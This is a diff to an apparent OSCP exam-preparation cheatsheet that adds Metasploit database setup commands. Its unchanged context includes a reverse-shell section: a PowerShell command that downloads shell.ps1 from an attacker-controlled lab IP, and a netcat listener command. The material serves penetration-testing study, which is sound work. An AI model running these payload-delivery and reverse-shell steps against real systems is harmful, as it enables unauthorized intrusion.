@@ -3,7 +3,8 @@ For OSCP preparation!
 
 ## CheatSheet
 * [Reverse shell](#Reverse)
-
+* [Powershell Cheatsheet](#Useful-GOTO LIST)
+* [Metasploit Setup](#Metasploit)
 ### Bash
 
 ```bash
@@ -57,4 +58,18 @@ PS> Invoke-WebRequest http://10.10.15.15/shell.ps1 -OutFile c:\shell.ps1
 
 Start Listerner > nc -lvnp 4444
 If reverse shell does not connect -Verify if target machine has AV as it may delete the netcat.
+```
+## Metasploit
+
+```
+root@Miracle:~# apt update; apt install metasploit-framework 
+root@Miracle:~# msfdb delete
+root@Miracle:~# msfdb init
+root@Miracle:~# cp /usr/share/metasploit-framework/config/database.yml /root/.msf4/
+root@Miracle:~# service postgresql restart
+root@Miracle:~# msfconsole
+MSF5 > db_status
+Msf5 > db_rebuild_cache
+
+Easy
 ```
